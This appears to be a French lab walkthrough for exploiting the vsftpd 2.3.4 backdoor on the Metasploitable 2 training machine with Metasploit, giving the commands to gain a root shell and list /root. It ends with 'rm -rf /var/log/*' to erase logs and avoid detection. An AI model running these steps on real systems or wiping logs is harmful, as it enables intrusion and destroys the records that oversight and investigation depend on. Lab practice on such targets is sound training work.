# Pentest sur la machine Metasploit 2

## Exploitation de vsftpd 2.3.4

Sur la Kali Linux, vérifier que le service FTP est actif en effectuant une connexion : 
```bash
ftp 10.10.0.200
```

### Lancement de Metasploit

```bash
sudo msfconsole
```

<p align="center">
    <img src="msfconsole.png" alt="msfconsole" style="width: 2000px;" />
</p>

### Chargement et configuration du module d'exploitation

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

```bash
set RHOSTS 10.10.0.200
set RPORT 21
```

```bash
run
```
<p align="center">
    <img src="exploit.png" alt="exploit" style="width: 2000px;" />
</p>

### Vérifications post-exploit

Pour vérifier si cela a réussi (whoami doit renvoyer root) : 

```bash
whoami
```

Lister les fichiers sensibles : 

```bash
ls /root
```

<p align="center">
    <img src="post-exploit.png" alt="post-exploit" style="width: 2000px;" />
</p>

Eviter que les activités de pentest soient détectées : 

```bash
rm -rf /var/log/*
```